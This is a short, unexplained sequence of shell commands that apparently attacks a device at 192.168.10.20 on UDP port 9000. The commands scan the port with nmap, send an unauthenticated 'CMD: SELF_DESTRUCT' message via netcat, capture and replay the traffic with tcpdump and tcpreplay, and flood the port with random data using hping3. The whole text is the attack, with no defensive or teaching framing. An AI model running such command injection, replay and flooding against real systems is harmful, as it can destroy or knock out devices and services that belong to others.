sudo nmap -sU -p 9000 192.168.10.20
echo "CMD: SELF_DESTRUCT" | nc -u 192.168.10.20 9000
sudo tcpdump -i eth0 udp port 9000 -w capture.pcap
sudo tcpreplay --intf1=eth0 capture.pcap
sudo hping3 --udp -p 9000 -d 120 -E /dev/urandom --flood 192.168.10.20
